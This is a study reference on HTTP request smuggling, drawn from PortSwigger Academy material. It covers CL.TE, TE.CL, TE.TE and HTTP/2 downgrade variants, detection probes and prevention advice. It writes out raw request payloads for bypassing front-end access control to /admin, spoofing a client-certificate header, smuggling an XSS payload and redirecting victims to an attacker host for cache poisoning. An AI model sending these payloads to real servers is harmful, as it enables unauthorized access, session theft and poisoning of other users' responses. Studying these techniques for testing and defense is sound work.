# HTTP Request Smuggling — Reference

Quick-reference built from the PortSwigger Web Security Academy request-smuggling topic.
For when you forget a detail mid-hunt. Techniques are HTTP/1 unless stated; in Burp switch the
protocol manually (Inspector > Request attributes) because Burp/browsers default to HTTP/2.

---

## 1. What it is

Request smuggling interferes with how a server processes a *sequence* of HTTP requests on one
connection. Impact: bypass security controls, access sensitive data, compromise other users.
Primarily an HTTP/1 problem; HTTP/2 sites are affected when the front-end downgrades to HTTP/1.

## 2. The front-end / back-end chain

- **Front-end** (load balancer / reverse proxy) receives user requests.
- **Back-end** runs the app.

The front-end multiplexes many requests down one persistent back-end connection. HTTP/1 has no
per-request framing, so both servers must agree where one request ends and the next begins. If
they disagree, an attacker's trailing bytes get prepended to the *next* user's request.

## 3. Root cause: Content-Length vs Transfer-Encoding

Two ways to delimit an HTTP/1 body:

**Content-Length (CL)** — body length in bytes:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**Transfer-Encoding: chunked (TE)** — each chunk is `hex-size\r\n data\r\n`, ended by a `0` chunk:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

Spec says if both present, ignore CL. Breaks down across a chain because some servers don't
support TE in requests, and some can be tricked into ignoring it when it's obfuscated.

> Burp auto-unpacks chunked encoding and browsers rarely send it — that's why testers miss TE.

## 4. Vulnerability classes

### CL.TE — front-end CL, back-end TE

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end reads 13 bytes (through `SMUGGLED`), forwards all. Back-end honors chunked, sees the
`0` chunk = end, so `SMUGGLED` starts the next request.

### TE.CL — front-end TE, back-end CL

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Front-end processes chunks (8-byte `SMUGGLED`, then `0` = end). Back-end reads only 3 bytes, rest
starting at `SMUGGLED` becomes the next request. In Burp: uncheck **Update Content-Length**. Must
end with trailing `\r\n\r\n` after the final `0`.

### TE.TE — obfuscated TE, one server ignores it

Both support TE; obfuscate so only one processes it. Then it degrades to CL.TE or TE.CL. Variants:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: x
```

---

## 5. Finding — timing techniques

Most generally effective detection. Send a request that stalls if vulnerable.

**CL.TE probe** (back-end waits for a chunk that never comes → delay):

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**TE.CL probe** (back-end waits for more body → delay):

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

> Order matters: the TE.CL probe can disrupt other users if the app is actually CL.TE. Run the
> CL.TE probe first; only run TE.CL if CL.TE fails.

## 6. Confirming — differential responses

Send an **attack** request then a **normal** request on separate connections, back to back.

Normal request (usually 200):

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**Confirm CL.TE** — attack:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Success = the next request hits `/404` → 404 confirms interference.

**Confirm TE.CL** — attack (end with trailing `\r\n\r\n` after `0`):

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

**Cautions:** use separate connections; match URL + param names (routing); send normal request
immediately (race); load balancers may split attack/normal to different back-ends (retry); if a
request you didn't send is affected, another user was hit — proceed carefully.

---

## 7. Exploiting

### Bypass front-end access control
Back-end trusts front-end checks. Smuggle a request to a restricted path:

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

### Reveal front-end request rewriting
Find a POST that reflects a param; put the reflected param last; smuggle it with a `Content-Length`
slightly too large and grow it gradually. The next (rewritten) request is reflected back, exposing
added headers (`X-Forwarded-For`, user IDs, TLS CN). Apply those rewrites to your smuggled requests.

### Bypass client-cert auth (mTLS)
Front-end overwrites `X-SSL-CLIENT-CN` on inbound, but smuggled requests are invisible to it:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

### Capture other users' requests
Smuggle to a storage endpoint (comment/profile) with the target param last and an oversized CL.
The victim's request (headers, session cookie) is appended into the stored value and displayed.
Capture stops at the first `&` in the appended data.

### Reflected XSS without a lure
Smuggle a request carrying the payload in a header; the next user receives the reflection:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

### On-site → open redirect
Abuse Host-based folder redirects (Apache/IIS) so the victim's JS request gets redirected off-site:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

### Web cache poisoning
Same redirect trick, but the appended request targets a cacheable asset, so the off-site redirect
is cached under `/static/include.js` and served to everyone. Persistent, unlike a one-off hit.

### Web cache deception
Smuggle a request for the victim's private data (`/private/messages`); the response is cached under
the appended request's static URL; attacker fetches that URL to read the victim's content.

---

## 8. Advanced (HTTP/2)

End-to-end HTTP/2 is safe (binary frames carry explicit length). Downgrading to HTTP/1 reintroduces
ambiguity, and most of the below depend on it.

- **H2.CL** — front-end copies the HTTP/2 `content-length` into the downgraded request without
  validating it against frame length. Add a trailing param + slightly-long CL on the smuggled prefix
  so the victim's request is truncated before its headers.
- **H2.TE** — front-end forwards `transfer-encoding: chunked` (spec says strip/block) to a chunked
  HTTP/1 back-end. H2.CL and H2.TE then enable the same attacks as CL.TE / TE.CL.
- **Hidden HTTP/2** — server supports H2 but doesn't advertise via ALPN. In Burp enable
  **Allow HTTP/2 ALPN override** and set Protocol = HTTP/2 in the Inspector.
- **CRLF injection** — HTTP/2 header values can contain `\r\n`; on downgrade it becomes a real
  delimiter, so `foo: bar\r\nTransfer-Encoding: chunked` splits into two HTTP/1 headers.
- **HTTP/2 request splitting** — split inside the headers (works with GET). Front-ends replace
  `:authority` with a `Host` header appended after existing headers, so position your injected
  `Host` so it lands in the first request after the split.
- **Request tunnelling** — uses HTTP/2-only inputs for high-severity exploits even without
  front-end/back-end connection reuse.
- **0.CL** — front-end ignores a CL the back-end processes. Long thought unexploitable (deadlock);
  break the deadlock with an early-response gadget, then a double desync builds the full exploit.
  Whitepaper: *HTTP/1.1 Must Die*.
- **Response queue poisoning** — split one request into two complete back-end requests; responses
  misalign and users receive each other's responses.
- Related: **CL.0** / H2.0, **client-side (browser-powered) desync**, **pause-based desync**.

---

## 9. Prevention

- Use **HTTP/2 end to end**; disable downgrading.
- If downgrading is unavoidable, validate rewritten HTTP/1 requests: reject newlines in headers,
  colons in header names, spaces in the method.
- Normalize ambiguous requests at the front-end; back-end rejects still-ambiguous ones by closing
  the TCP connection.
- **Never assume a request has no body** (root cause of CL.0 / client-side desync).
- Discard the connection on any server-level exception while handling a request.
- Disabling back-end connection reuse mitigates some attacks but not request tunnelling.
